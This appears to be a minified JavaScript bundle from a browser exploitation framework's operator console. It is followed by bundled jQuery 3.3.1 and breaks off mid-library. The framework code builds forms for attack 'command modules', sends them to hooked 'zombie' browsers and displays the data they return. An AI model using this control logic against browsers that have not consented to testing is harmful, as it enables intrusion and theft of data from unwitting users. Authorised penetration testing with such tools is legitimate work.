function generate_form_input_field(e,t,n,o,r){var i=null,a=null;switch(t.ui_label||(t.ui_label=t.name),t.type||(t.type="textfield"),t.value||(t.value=""),a={id:"form-zombie-"+r.session+"-field-"+t.name,name:"txt_"+t.name,fieldLabel:t.ui_label,anchor:"70%",allowBlank:!1,value:t.value},t.type.toLowerCase()){case"textfield":i=new Ext.form.TextField(a);break;case"textarea":i=new Ext.form.TextArea(a);break;case"hidden":i=new Ext.form.Hidden(a);break;case"label":a.fieldLabel="",a.html=t.html,i=new Ext.form.Label(a);break;case"checkbox":a.name="chk_"+t.name,i=new Ext.form.Checkbox(a);break;case"checkboxgroup":a.name="chkg_"+t.name,a.items=t.items,i=new Ext.form.CheckboxGroup(a);break;case"combobox":a.name="com_"+t.name,a.triggerAction="all",(t.reloadOnChange||null!=t.defaultPayload)&&(Ext.getCmp("payload-panel").show(),a.listeners={select:function(e){get_dynamic_payload_details(e.getValue(),r)},afterrender:function(e){e.setValue(t.defaultPayload),get_dynamic_payload_details(e.getValue(),r)}}),a.store=new Ext.data.ArrayStore({fields:t.store_fields,data:t.store_data}),i=new Ext.form.ComboBox(a);break;default:i=new Ext.form.TextField(a)}for(definition in t)"string"==typeof t[definition]&&"type"!=definition&&"name"!=definition&&(i[definition]=t[definition]);return n&&i.setValue(n),o&&i.setDisabled(!0),e.add(i),i}function get_dynamic_payload_details(e,t){modid=Ext.getCmp("form-zombie-"+t.session+"-field-mod_id").value,Ext.Ajax.request({loadMask:!0,url:"/ui/modules/select/commandmodule.json",method:"POST",params:"command_module_id="+modid+"&payload_name="+e,success:function(e){var n=Ext.decode(e.responseText);n=n.command_modules[1][0],Ext.getCmp("payload-panel").removeAll(),Ext.each(n.data,function(e){generate_form_input_field(Ext.getCmp("payload-panel"),e,null,!1,t)}),Ext.getCmp("payload-panel").doLayout()}})}function genExistingExploitPanel(e,t,n,o){"object"==typeof e?(o.showBusy(),e.removeAll(),Ext.Ajax.request({url:"/ui/modules/select/command.json",method:"POST",params:"command_id="+t,loadMask:!0,success:function(r){var i=Ext.decode(r.responseText);if(i&&i.definition){var a=new Ext.form.FormPanel({url:"/ui/modules/commandmodule/reexecute",id:"form-command-module-zombie-"+n.session,border:!1,labelWidth:75,defaultType:"textfield",title:re_execute_command_title,bodyStyle:"padding: 5px;",items:[new Ext.form.Hidden({name:"command_id",value:t})],buttons:[{text:zombie_reexecute_button_text,handler:function(){var e=Ext.getCmp("form-command-module-zombie-"+n.session);e&&e.getForm().isValid()&&(o.update_sending("Sending commands to "+n.ip+"..."),e.getForm().submit({params:{nonce:Ext.get("nonce").dom.value},success:function(){o.update_sent("Commands sent to zombie "+n.ip)},failure:function(){o.update_fail("Error!")}}))}}]});Ext.each(i.definition.Data,function(e){var t=null;"string"==typeof e&&(t=i.data[e]),"object"==typeof e&&"object"==typeof e[0]&&(t=i.data[e[0].name]),generate_form_input_field(a,e,t,!1,n)});var s=new Ext.data.JsonStore({url:"/ui/modules/select/command_results.json?command_id="+t,storeId:"command-results-store-zombie-"+n.session,root:"results",remoteSort:!1,autoDestroy:!0,fields:[{name:"date",type:"date",dateFormat:"timestamp"},{name:"data"}]});Ext.TaskMgr.start({run:function(){var e=Ext.getCmp("command-results-grid-zombie-"+n.session);s&&e&&s.reload()},interval:4e3});var l=new Ext.grid.GridPanel({id:"command-results-grid-zombie-"+n.session,store:s,border:!1,hideHeaders:!0,title:"Command results",viewConfig:{forceFit:!0},columns:[new Ext.grid.RowNumberer({width:20}),{dataIndex:"date",sortable:!1,renderer:function(e,t,n){for(index in html=String.format("<div style='color:#385F95;text-align:right;'>{0}</div>",e),html+="<p>",n.data.data){result=n.data.data[index],index=index.toString().replace("_"," ");var o=new RegExp("image=data:image/(jpg|png);base64,","");if(result.match(o))try{var r=result.replace(/[\r\n]/g,"");base64_data=window.atob(r.replace(o,"")),html+=String.format('<img src="{0}" /><br>',r.replace(/^image=/,""))}catch(i){console.log("Received invalid base64 encoded image string: "+i.toString()),html+=String.format("<b>{0}</b>: {1}<br>",index,result)}else html+=String.format("<b>{0}</b>: {1}<br>",index,$jEncoder.encoder.encodeForHTML(result).replace(/&lt;br&gt;/g,"<br>"))}return html+="</p>",html}}]});l.store.load();var d=new Ext.Panel({id:"command-results-accordion-zombie-"+n.session,layout:"accordion",border:!1,items:[l,a]});e.add(d),e.doLayout(),o.update_ready()}else Ext.beef.msg("Error!","We could not retrieve the definition of that command module...")}})):Ext.beef.msg("Bad!","Incorrect panel chosen.")}function genNewExploitPanel(e,t,n,o,r){if("object"==typeof e){var i=Ext.getCmp("command-module-grid-zombie-"+o.session);r=Ext.getCmp("commands-bbar-zombie-"+o.session);e.removeAll(),"some special command module"==n||Ext.Ajax.request({loadMask:!0,url:"/ui/modules/select/commandmodule.json",method:"POST",params:"command_module_id="+t,success:function(n){var a=Ext.decode(n.responseText);if(a){var s="/ui/modules/commandmodule/new";a.dynamic&&(s="/ui/modules/commandmodule/dynamicnew"),a=a.command_modules[1];var l=new Ext.form.FormPanel({url:s,id:"form-command-module-zombie-"+o.session,border:!1,labelWidth:75,defaultType:"textfield",title:a.Name,autoScroll:!0,bodyStyle:"padding: 5px;",items:[new Ext.form.Hidden({name:"zombie_session",value:o.session}),new Ext.form.Hidden({name:"command_module_id",value:t}),new Ext.form.DisplayField({name:"command_module_description",fieldLabel:"Description",fieldClass:"command-module-panel-description",value:a.Description}),new Ext.form.DisplayField({name:"command_module_id_visible",fieldLabel:"Id",fieldClass:"command-module-panel-description",value:t})],buttons:[{text:zombie_execute_button_text,handler:function(){var e=Ext.getCmp("form-command-module-zombie-"+o.session);new Array;e&&e.getForm().isValid()?(r.update_sending("Sending commands to "+o.ip+"..."),e.getForm().submit({params:{nonce:Ext.get("nonce").dom.value},success:function(){i.i=0,i.store.reload({params:{nonce:Ext.get("nonce").dom.value}}),r.update_sent("Commands sent to zombie "+o.ip)},failure:function(){r.update_fail("Error!")}})):r.update_fail("Please complete all input fields!")}}]}),d=new Ext.Panel({id:"payload-panel",bodyStyle:"padding:10px;",layout:"form",bodyBorder:!1,height:200,hidden:!0,border:!1});Ext.each(a.Data,function(e){generate_form_input_field(l,e,null,!1,o)}),l.add(d),e.add(l),e.doLayout(),e.configLoadMask.hide()}else Ext.beef.msg("Error!","We could not retrieve the definition of that command_module...")}})}else Ext.beef.msg("Bad!","Incorrect panel chosen.")}function locationHashChanged(){var e=location_hash("id");if(null!==e){var t=Object.values(beefwui.hooked_browsers).find(t=>t.session===e);e=e.replace(/[^a-z0-9]/gi,""),console.log("Loading hooked browser with ID: "+e),mainPanel.remove(mainPanel.getComponent("current-browser")),mainPanel.getComponent("current-browser")||mainPanel.add(new ZombieTab(t)),mainPanel.activate(mainPanel.getComponent("current-browser"))}}function location_hash(e){var t=location.hash.match(new RegExp(e+"=([^&]*)"));return t?t[1]:null}function removeHash(){history.pushState("",document.title,window.location.pathname+window.location.search)}function search_module(e,t){function n(e,t,n){n[t]=e.toLowerCase().replace(/"/g,"")}function o(e){return Boolean(this.toString().toLowerCase().replace(/\s\([0-9]+\)/g,"").indexOf(e)+1)}function r(e){return!!t.some(o,e.text)||!!e.children&&(e.children=e.children.filter(r),Boolean(e.children.length))}function i(e){if(e.children){e.expanded=!0;for(var t=e.children.length,n=0;n<e.children.length;n++)e.children&&(t+=i(e.children[n]));return e.children.forEach(i),e.text=e.text.replace(/([-_ 0-9a-zA-Z]+)\(([0-9]+)\)/,"$1("+t+")"),t-1}return 0}if(-1==t.search(/\w/))return a;for(var a=new Array,s=0;s<e.length;s++)a.push(e[s].attributes);var l=jQuery.extend(!0,[],a);(t=t.replace(/"\s*"/g," ").replace(/\s+/g," ").match(/"[^"]+"|\S+/g)).forEach(n);var d=l.filter(r);return d.forEach(i),d}!function(){var e=!1,t=/xyz/.test(function(){xyz})?/\b_super\b/:/.*/;this.Class=function(){},Class.extend=function(n){function o(){!e&&this.init&&this.init.apply(this,arguments)}var r=this.prototype;e=!0;var i=new this;for(var a in e=!1,n)i[a]="function"==typeof n[a]&&"function"==typeof r[a]&&t.test(n[a])?function(e,t){return function(){var n=this._super;this._super=r[e];var o=t.apply(this,arguments);return this._super=n,o}}(a,n[a]):n[a];return o.prototype=i,o.constructor=o,o.extend=arguments.callee,o}}(),function(e,t){"use strict";"object"==typeof module&&"object"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error("jQuery requires a window with a document");return t(e)}:t(e)}("undefined"!=typeof window?window:this,function(e,t){"use strict";function n(e,t,n){var o,r=(t=t||ae).createElement("script");if(r.text=e,n)for(o in ve)n[o]&&(r[o]=n[o]);t.head.appendChild(r).parentNode.removeChild(r)}function o(e){return null==e?e+"":"object"==typeof e||"function"==typeof e?pe[fe.call(e)]||"object":typeof e}function r(e){var t=!!e&&"length"in e&&e.length,n=o(e);return!be(e)&&!xe(e)&&("array"===n||0===t||"number"==typeof t&&t>0&&t-1 in e)}function i(e,t){return e.nodeName&&e.nodeName.toLowerCase()===t.toLowerCase()}function a(e,t,n){return be(t)?we.grep(e,function(e,o){return!!t.call(e,o,e)!==n}):t.nodeType?we.grep(e,function(e){return e===t!==n}):"string"!=typeof t?we.grep(e,function(e){return ue.call(t,e)>-1!==n}):we.filter(t,e,n)}function s(e,t){for(;(e=e[t])&&1!==e.nodeType;);return e}function l(e){var t={};return we.each(e.match(Ae)||[],function(e,n){t[n]=!0}),t}function d(e){return e}function c(e){throw e}function u(e,t,n,o){var r;try{e&&be(r=e.promise)?r.call(e).done(t).fail(n):e&&be(r=e.then)?r.call(e,t,n):t.apply(void 0,[e].slice(o))}catch(e){n.apply(void 0,[e])}}function p(){ae.removeEventListener("DOMContentLoaded",p),e.removeEventListener("load",p),we.ready()}function f(e,t){return t.toUpperCase()}function h(e){return e.replace(Oe,"ms-").replace(ze,f)}function m(){this.expando=we.expando+m.uid++}function g(e){return"true"===e||"false"!==e&&("null"===e?null:e===+e+""?+e:qe.test(e)?JSON.parse(e):e)}function y(e,t,n){var o;if(void 0===n&&1===e.nodeType)if(o="data-"+t.replace(Be,"-$&").toLowerCase(),"string"==typeof(n=e.getAttribute(o))){try{n=g(n)}catch(e){}He.set(e,t,n)}else n=void 0;return n}function b(e,t,n,o){var r,i,a=20,s=o?function(){return o.cur()}:function(){return we.css(e,t,"")},l=s(),d=n&&n[3]||(we.cssNumber[t]?"":"px"),c=(we.cssNumber[t]||"px"!==d&&+l)&&We.exec(we.css(e,t));if(c&&c[3]!==d){for(l/=2,d=d||c[3],c=+l||1;a--;)we.style(e,t,c+d),(1-i)*(1-(i=s()/l||.5))<=0&&(a=0),c/=i;c*=2,we.style(e,t,c+d),n=n||[]}return n&&(c=+c||+l||0,r=n[1]?c+(n[1]+1)*n[2]:+n[2],o&&(o.unit=d,o.start=c,o.end=r)),r}function x(e){var t,n=e.ownerDocument,o=e.nodeName,r=Ze[o];return r||(t=n.body.appendChild(n.createElement(o)),r=we.css(t,"display"),t.parentNode.removeChild(t),"none"===r&&(r="block"),Ze[o]=r,r)}function v(e,t){for(var n,o,r=[],i=0,a=e.length;i<a;i++)(o=e[i]).style&&(n=o.style.display,t?("none"===n&&(r[i]=Fe.get(o,"display")||null,r[i]||(o.style.display="")),""===o.style.display&&Ue(o)&&(r[i]=x(o))):"none"!==n&&(r[i]="none",Fe.set(o,"display",n)));for(i=0;i<a;i++)null!=r[i]&&(e[i].style.display=r[i]);return e}function w(e,t){var n;return n="undefined"!=typeof e.getElementsByTagName?e.getElementsByTagName(t||"*"):"undefined"!=typeof e.querySelectorAll?e.querySelectorAll(t||"*"):[],void 0===t||t&&i(e,t)?we.merge([e],n):n}function _(e,t){for(var n=0,o=e.length;n<o;n++)Fe.set(e[n],"globalEval",!t||Fe.get(t[n],"globalEval"))}function k(e,t,n,r,i){for(var a,s,l,d,c,u,p=t.createDocumentFragment(),f=[],h=0,m=e.length;h<m;h++)if((a=e[h])||0===a)if("object"===o(a))we.merge(f,a.nodeType?[a]:a);else if(Ke.test(a)){for(s=s||p.appendChild(t.createElement("div")),l=(Ve.exec(a)||["",""])[1].toLowerCase(),d=Ye[l]||Ye._default,s.innerHTML=d[1]+we.htmlPrefilter(a)+d[2],u=d[0];u--;)s=s.lastChild;we.merge(f,s.childNodes),(s=p.firstChild).textContent=""}else f.push(t.createTextNode(a));for(p.textContent="",h=0;a=f[h++];)if(r&&we.inArray(a,r)>-1)i&&i.push(a);else if(c=we.contains(a.ownerDocument,a),s=w(p.appendChild(a),"script"),c&&_(s),n)for(u=0;a=s[u++];)Qe.test(a.type||"")&&n.push(a);return p}function E(){return!0}function T(){return!1}function C(){try{return ae.activeElement}catch(e){}}function S(e,t,n,o,r,i){var a,s;if("object"==typeof t){for(s in"string"!=typeof n&&(o=o||n,n=void 0),t)S(e,s,n,o,t[s],i);return e}if(null==o&&null==r?(r=n,o=n=void 0):null==r&&("string"==typeof n?(r=o,o=void 0):(r=o,o=n,n=void 0)),!1===r)r=T;else if(!r)return e;return 1===i&&(a=r,(r=function(e){return we().off(e),a.apply(this,arguments)}).guid=a.guid||(a.guid=we.guid++)),e.each(function(){we.event.add(this,t,r,o,n)})}function j(e,t){return i(e,"table")&&i(11!==t.nodeType?t:t.firstChild,"tr")&&we(e).children("tbody")[0]||e}function P(e){return e.type=(null!==e.getAttribute("type"))+"/"+e.type,e}function D(e){return"true/"===(e.type||"").slice(0,5)?e.type=e.type.slice(5):e.removeAttribute("type"),e}function M(e,t){var n,o,r,i,a,s,l,d;if(1===t.nodeType){if(Fe.hasData(e)&&(i=Fe.access(e),a=Fe.set(t,i),d=i.events))for(r in delete a.handle,a.events={},d)for(n=0,o=d[r].length;n<o;n++)we.event.add(t,r,d[r][n]);He.hasData(e)&&(s=He.access(e),l=we.extend({},s),He.set(t,l))}}function A(e,t){var n=t.nodeName.toLowerCase();"input"===n&&Xe.test(e.type)?t.checked=e.checked:"input"!==n&&"textarea"!==n||(t.defaultValue=e.defaultValue)}function L(e,t,o,r){t=de.apply([],t);var i,a,s,l,d,c,u=0,p=e.length,f=p-1,h=t[0],m=be(h);if(m||p>1&&"string"==typeof h&&!ye.checkClone&&at.test(h))return e.each(function(n){var i=e.eq(n);m&&(t[0]=h.call(this,n,i.html())),L(i,t,o,r)});if(p&&(a=(i=k(t,e[0].ownerDocument,!1,e,r)).firstChild,1===i.childNodes.length&&(i=a),a||r)){for(l=(s=we.map(w(i,"script"),P)).length;u<p;u++)d=i,u!==f&&(d=we.clone(d,!0,!0),l&&we.merge(s,w(d,"script"))),o.call(e[u],d,u);if(l)for(c=s[s.length-1].ownerDocument,we.map(s,D),u=0;u<l;u++)d=s[u],Qe.test(d.type||"")&&!Fe.access(d,"globalEval")&&we.contains(c,d)&&(d.src&&"module"!==(d.type||"").toLowerCase()?we._evalUrl&&we._evalUrl(d.src):n(d.textContent.replace(st,""),c,d))}return e}function N(e,t,n){for(var o,r=t?we.filter(t,e):e,i=0;null!=(o=r[i]);i++)n||1!==o.nodeType||we.cleanData(w(o)),o.parentNode&&(n&&we.contains(o.ownerDocument,o)&&_(w(o,"script")),o.parentNode.removeChild(o));return e}function I(e,t,n){var o,r,i,a,s=e.style;return(n=n||dt(e))&&(""!==(a=n.getPropertyValue(t)||n[t])||we.contains(e.ownerDocument,e)||(a=we.style(e,t)),!ye.pixelBoxStyles()&&lt.test(a)&&ct.test(t)&&(o=s.width,r=s.minWidth,i=s.maxWidth,s.minWidth=s.maxWidth=s.width=a,a=n.width,s.width=o,s.minWidth=r,s.maxWidth=i)),void 0!==a?a+"":a}function O(e,t){return{get:function(){if(!e())return(this.get=t).apply(this,arguments);delete this.get}}}function z(e){if(e in gt)return e;for(var t=e[0].toUpperCase()+e.slice(1),n=mt.length;n--;)if((e=mt[n]+t)in gt)return e}function R(e){var t=we.cssProps[e];return t||(t=we.cssProps[e]=z(e)||e),t}function F(e,t,n){var o=We.exec(t);return o?Math.max(0,o[2]-(n||0))+(o[3]||"px"):t}function H(e,t,n,o,r,i){var a="width"===t?1:0,s=0,l=0;if(n===(o?"border":"content"))return 0;for(;a<4;a+=2)"margin"===n&&(l+=we.css(e,n+Ge[a],!0,r)),o?("content"===n&&(l-=we.css(e,"padding"+Ge[a],!0,r)),"margin"!==n&&(l-=we.css(e,"border"+Ge[a]+"Width",!0,r))):(l+=we.css(e,"padding"+Ge[a],!0,r),"padding"!==n?l+=we.css(e,"border"+Ge[a]+"Width",!0,r):s+=we.css(e,"border"+Ge[a]+"Width",!0,r));return!o&&i>=0&&(l+=Math.max(0,Math.ceil(e["offset"+t[0].toUpperCase()+t.slice(1)]-i-l-s-.5))),l}function q(e,t,n){var o=dt(e),r=I(e,t,o),i="border-box"===we.css(e,"boxSizing",!1,o),a=i;if(lt.test(r)){if(!n)return r;r="auto"}return a=a&&(ye.boxSizingReliable()||r===e.style[t]),("auto"===r||!parseFloat(r)&&"inline"===we.css(e,"display",!1,o))&&(r=e["offset"+t[0].toUpperCase()+t.slice(1)],a=!0),(r=parseFloat(r)||0)+H(e,t,n||(i?"border":"content"),a,o,r)+"px"}function B(e,t,n,o,r){return new B.prototype.init(e,t,n,o,r)}function $(){bt&&(!1===ae.hidden&&e.requestAnimationFrame?e.requestAnimationFrame($):e.setTimeout($,we.fx.interval),we.fx.tick())}function W(){return e.setTimeout(function(){yt=void 0}),yt=Date.now()}function G(e,t){var n,o=0,r={height:e};for(t=t?1:0;o<4;o+=2-t)r["margin"+(n=Ge[o])]=r["padding"+n]=e;return t&&(r.opacity=r.width=e),r}function U(e,t,n){for(var o,r=(X.tweeners[t]||[]).concat(X.tweeners["*"]),i=0,a=r.length;i<a;i++)if(o=r[i].call(n,t,e))return o}function J(e,t,n){var o,r,i,a,s,l,d,c,u="width"in t||"height"in t,p=this,f={},h=e.style,m=e.nodeType&&Ue(e),g=Fe.get(e,"fxshow");for(o in n.queue||(null==(a=we._queueHooks(e,"fx")).unqueued&&(a.unqueued=0,s=a.empty.fire,a.empty.fire=function(){a.unqueued||s()}),a.unqueued++,p.always(function(){p.always(function(){a.unqueued--,we.queue(e,"fx").length||a.empty.fire()})})),t)if(r=t[o],xt.test(r)){if(delete t[o],i=i||"toggle"===r,r===(m?"hide":"show")){if("show"!==r||!g||void 0===g[o])continue;m=!0}f[o]=g&&g[o]||we.style(e,o)}if((l=!we.isEmptyObject(t))||!we.isEmptyObject(f))for(o in u&&1===e.nodeType&&(n.overflow=[h.overflow,h.overflowX,h.overflowY],null==(d=g&&g.display)&&(d=Fe.get(e,"display")),"none"===(c=we.css(e,"display"))&&(d?c=d:(v([e],!0),d=e.style.display||d,c=we.css(e,"display"),v([e]))),("inline"===c||"inline-block"===c&&null!=d)&&"none"===we.css(e,"float")&&(l||(p.done(function(){h.display=d}),null==d&&(c=h.display,d="none"===c?"":c)),h.display="inline-block")),n.overflow&&(h.overflow="hidden",p.always(function(){h.overflow=n.overflow[0],h.overflowX=n.overflow[1],h.overflowY=n.overflow[2]})),l=!1,f)l||(g?"hidden"in g&&(m=g.hidden):g=Fe.access(e,"fxshow",{display:d}),i&&(g.hidden=!m),m&&v([e],!0),p.done(function(){for(o in m||v([e]),Fe.remove(e,"fxshow"),f)we.style(e,o,f[o])})),l=U(m?g[o]:0,o,p),o in g||(g[o]=l.start,m&&(l.end=l.start,l.start=0))}function Z(e,t){var n,o,r,i,a;for(n in e)if(r=t[o=h(n)],i=e[n],Array.isArray(i)&&(r=i[1],i=e[n]=i[0]),n!==o&&(e[o]=i,delete e[n]),(a=we.cssHooks[o])&&"expand"in a)for(n in i=a.expand(i),delete e[o],i)n in e||(e[n]=i[n],t[n]=r);else t[o]=r}function X(e,t,n){var o,r,i=0,a=X.prefilters.length,s=we.Deferred().always(function(){delete l.elem}),l=function(){if(r)return!1;for(var t=yt||W(),n=Math.max(0,d.startTime+d.duration-t),o=1-(n/d.duration||0),i=0,a=d.tweens.length;i<a;i++)d.tweens[i].run(o);return s.notifyWith(e,[d,o,n]),o<1&&a?n:(a||s.notifyWith(e,[d,1,0]),s.resolveWith(e,[d]),!1)},d=s.promise({elem:e,props:we.extend({},t),opts:we.extend(!0,{specialEasing:{},easing:we.easing._default},n),originalProperties:t,originalOptions:n,startTime:yt||W(),duration:n.duration,tweens:[],createTween:function(t,n){var o=we.Tween(e,d.opts,t,n,d.opts.specialEasing[t]||d.opts.easing);return d.tweens.push(o),o},stop:function(t){var n=0,o=t?d.tweens.length:0;if(r)return this;for(r=!0;n<o;n++)d.tweens[n].run(1);return t?(s.notifyWith(e,[d,1,0]),s.resolveWith(e,[d,t])):s.rejectWith(e,[d,t]),this}}),c=d.props;for(Z(c,d.opts.specialEasing);i<a;i++)if(o=X.prefilters[i].call(d,e,c,d.opts))return be(o.stop)&&(we._queueHooks(d.elem,d.opts.queue).stop=o.stop.bind(o)),o;return we.map(c,U,d),be(d.opts.start)&&d.opts.start.call(e,d),d.progress(d.opts.progress).done(d.opts.done,d.opts.complete).fail(d.opts.fail).always(d.opts.always),we.fx.timer(we.extend(l,{elem:e,anim:d,queue:d.opts.queue})),d}function V(e){return(e.match(Ae)||[]).join(" ")}function Q(e){return e.getAttribute&&e.getAttribute("class")||""}function Y(e){return Array.isArray(e)?e:"string"==typeof e&&e.match(Ae)||[]}function K(e,t,n,r){var i;if(Array.isArray(t))we.each(t,function(t,o){n||Mt.test(e)?r(e,o):K(e+"["+("object"==typeof o&&null!=o?t:"")+"]",o,n,r)});else if(n||"object"!==o(t))r(e,t);else for(i in t)K(e+"["+i+"]",t[i],n,r)}function ee(e){return function(t,n){"string"!=typeof t&&(n=t,t="*");var o,r=0,i=t.toLowerCase().match(Ae)||[];if(be(n))for(;o=i[r++];)"+"===o[0]?(o=o.slice(1)||"*",(e[o]=e[o]||[]).unshift(n)):(e[o]=e[o]||[]).push(n)}}function te(e,t,n,o){function r(s){var l;return i[s]=!0,we.each(e[s]||[],function(e,s){var d=s(t,n,o);return"string"!=typeof d||a||i[d]?a?!(l=d):void 0:(t.dataTypes.unshift(d),r(d),!1)}),l}var i={},a=e===$t;return r(t.dataTypes[0])||!i["*"]&&r("*")}function ne(e,t){var n,o,r=we.ajaxSettings.flatOptions||{};for(n in t)void 0!==t[n]&&((r[n]?e:o||(o={}))[n]=t[n]);return o&&we.extend(!0,e,o),e}function oe(e,t,n){for(var o,r,i,a,s=e.contents,l=e.dataTypes;"*"===l[0];)l.shift(),void 0===o&&(o=e.mimeType||t.getResponseHeader("Content-Type"));if(o)for(r in s)if(s[r]&&s[r].test(o)){l.unshift(r);break}if(l[0]in n)i=l[0];else{for(r in n){if(!l[0]||e.converters[r+" "+l[0]]){i=r;break}a||(a=r)}i=i||a}if(i)return i!==l[0]&&l.unshift(i),n[i]}function re(e,t,n,o){var r,i,a,s,l,d={},c=e.dataTypes.slice();if(c[1])for(a in e.converters)d[a.toLowerCase()]=e.converters[a];for(i=c.shift();i;)if(e.responseFields[i]&&(n[e.responseFields[i]]=t),!l&&o&&e.dataFilter&&(t=e.dataFilter(t,e.dataType)),l=i,i=c.shift())if("*"===i)i=l;else if("*"!==l&&l!==i){if(!(a=d[l+" "+i]||d["* "+i]))for(r in d)if((s=r.split(" "))[1]===i&&(a=d[l+" "+s[0]]||d["* "+s[0]])){!0===a?a=d[r]:!0!==d[r]&&(i=s[0],c.unshift(s[1]));break}if(!0!==a)if(a&&e.throws)t=a(t);else try{t=a(t)}catch(e){return{state:"parsererror",error:a?e:"No conversion from "+l+" to "+i}}}return{state:"success",data:t}}var ie=[],ae=e.document,se=Object.getPrototypeOf,le=ie.slice,de=ie.concat,ce=ie.push,ue=ie.indexOf,pe={},fe=pe.toString,he=pe.hasOwnProperty,me=he.toString,ge=me.call(Object),ye={},be=function(e){return"function"==typeof e&&"number"!=typeof e.nodeType},xe=function(e){return null!=e&&e===e.window},ve={type:!0,src:!0,noModule:!0},we=function(e,t){return new we.fn.init(e,t)},_e=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;we.fn=we.prototype={jquery:"3.3.1",constructor:we,length:0,toArray:function(){return le.call(this)},get:function(e){return null==e?le.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=we.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return we.each(this,e)},map:function(e){return this.pushStack(we.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(le.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(n>=0&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:ce,sort:ie.sort,splice:ie.splice},we.extend=we.fn.extend=function(){var e,t,n,o,r,i,a=arguments[0]||{},s=1,l=arguments.length,d=!1;for("boolean"==typeof a&&(d=a,a=arguments[s]||{},s++),"object"==typeof a||be(a)||(a={}),s===l&&(a=this,s--);s<l;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(o=e[t])&&(d&&o&&(we.isPlainObject(o)||(r=Array.isArray(o)))?(r?(r=!1,i=n&&Array.isArray(n)?n:[]):i=n&&we.isPlainObject(n)?n:{},a[t]=we.extend(d,i,o)):void 0!==o&&(a[t]=o));return a},we.extend({expando:"jQuery"+("3.3.1"+Math.random()).replace(/\D/g,""),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||"[object Object]"!==fe.call(e)||(t=se(e))&&("function"!=typeof(n=he.call(t,"constructor")&&t.constructor)||me.call(n)!==ge))},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){n(e)},each:function(e,t){var n,o=0;if(r(e))for(n=e.length;o<n&&!1!==t.call(e[o],o,e[o]);o++);else for(o in e)if(!1===t.call(e[o],o,e[o]))break;return e},trim:function(e){return null==e?"":(e+"").replace(_e,"")},makeArray:function(e,t){var n=t||[];return null!=e&&(r(Object(e))?we.merge(n,"string"==typeof e?[e]:e):ce.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:ue.call(t,e,n)},merge:function(e,t){for(var n=+t.length,o=0,r=e.length;o<n;o++)e[r++]=t[o];return e.length=r,e},grep:function(e,t,n){for(var o=[],r=0,i=e.length,a=!n;r<i;r++)!t(e[r],r)!==a&&o.push(e[r]);return o},map:function(e,t,n){var o,i,a=0,s=[];if(r(e))for(o=e.length;a<o;a++)null!=(i=t(e[a],a,n))&&s.push(i);else for(a in e)null!=(i=t(e[a],a,n))&&s.push(i);return de.apply([],s)},guid:1,support:ye}),"function"==typeof Symbol&&(we.fn[Symbol.iterator]=ie[Symbol.iterator]),we.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "),function(e,t){pe["[object "+t+"]"]=t.toLowerCase()});var ke=function(e){function t(e,t,n,o){var r,i,a,s,l,d,c,p=t&&t.ownerDocument,h=t?t.nodeType:9;if(n=n||[],"string"!=typeof e||!e||1!==h&&9!==h&&11!==h)return n;if(!o&&((t?t.ownerDocument||t:q)!==L&&A(t),t=t||L,I)){if(11!==h&&(l=ye.exec(e)))if(r=l[1]){if(9===h){if(!(a=t.getElementById(r)))return n;if(a.id===r)return n.push(a),n}else if(p&&(a=p.getElementById(r))&&F(t,a)&&a.id===r)return n.push(a),n}else{if(l[2])return Y.apply(n,t.getElementsByTagName(e)),n;if((r=l[3])&&_.getElementsByClassName&&t.getElementsByClassName)return Y.apply(n,t.getElementsByClassName(r)),n}if(_.qsa&&!U[e+" "]&&(!O||!O.test(e))){if(1!==h)p=t,c=e;else if("object"!==t.nodeName.toLowerCase()){for((s=t.getAttribute("id"))?s=s.replace(we,_e):t.setAttribute("id",s=H),i=(d=C(e)).length;i--;)d[i]="#"+s+" "+f(d[i]);c=d.join(","),p=be.test(e)&&u(t.parentNode)||t}if(c)try{return Y.apply(n,p.querySelectorAll(c)),n}catch(e){}finally{s===H&&t.removeAttribute("id")}}}return j(e.replace(se,"$1"),t,n,o)}function n(){function e(n,o){return t.push(n+" ")>k.cacheLength&&delete e[t.shift()],e[n+" "]=o}var t=[];return e}function o(e){return e[H]=!0,e}function r(e){var t=L.createElement("fieldset");try{return!!e(t)}catch(e){return!1}finally{t.parentNode&&t.parentNode.removeChild(t),t=null}}function i(e,t){for(var n=e.split("|"),o=n.length;o--;)k.attrHandle[n[o]]=t}function a(e,t){var n=t&&e,o=n&&1===e.nodeType&&1===t.nodeType&&e.sourceIndex-t.sourceIndex;if(o)return o;if(n)for(;n=n.nextSibling;)if(n===t)return-1;return e?1:-1}function s(e){return function(t){return"input"===t.nodeName.toLowerCase()&&t.type===e}}function l(e){return function(t){var n=t.nodeName.toLowerCase();return("input"===n||"button"===n)&&t.type===e}}function d(e){return function(t){return"form"in t?t.parentNode&&!1===t.disabled?"label"in t?"label"in t.parentNode?t.parentNode.disabled===e:t.disabled===e:t.isDisabled===e||t.isDisabled!==!e&&Ee(t)===e:t.disabled===e:"label"in t&&t.disabled===e}}function c(e){return o(function(t){return t=+t,o(function(n,o){for(var r,i=e([],n.length,t),a=i.length;a--;)n[r=i[a]]&&(n[r]=!(o[r]=n[r]))})})}function u(e){return e&&"undefined"!=typeof e.getElementsByTagName&&e}function p(){}function f(e){for(var t=0,n=e.length,o="";t<n;t++)o+=e[t].value;return o}function h(e,t,n){var o=t.dir,r=t.next,i=r||o,a=n&&"parentNode"===i,s=$++;return t.first?function(t,n,r){for(;t=t[o];)if(1===t.nodeType||a)return e(t,n,r);return!1}:function(t,n,l){var d,c,u,p=[B,s];if(l){for(;t=t[o];)if((1===t.nodeType||a)&&e(t,n,l))return!0}else 